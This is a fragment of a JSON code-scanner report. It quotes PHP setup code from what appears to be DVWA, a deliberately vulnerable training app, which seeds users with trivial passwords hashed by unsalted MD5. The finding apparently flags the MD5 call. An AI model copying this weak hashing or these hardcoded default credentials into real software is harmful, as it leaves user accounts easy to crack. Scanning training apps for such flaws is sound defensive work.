        "excerpt": "\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$avatarUrl}gordonb.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$avatarUrl}1337.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;4&#39;,&#39;Pablo&#39;,&#39;Picasso&#39;,&#39;pablo&#39;,MD5(&#39;letmein&#39;),&#39;{$avatarUrl}pablo.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;5&#39;,&#39;Bob&#39;,&#39;Smith&#39;,&#39;smithy&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}smithy.jpg&#39;, NOW(), &#39;0&#39;);&quot;;\nif( !mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) ) {\n\tdvwaMessagePush( &quot;Data could not be inserted into &#39;users&#39; table&lt;br /&gt;SQL: &quot; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) );\n\tdvwaPageReload();\n}\ndvwaMessagePush( &quot;Data inserted into &#39;users&#39; table.&quot; );\n",
        "startLocationLine": 60,
        "startLocationColumn": 30,
        "endLocationLine": 60,
        "endLocationColumn": 33
      }
    ]
  }
}
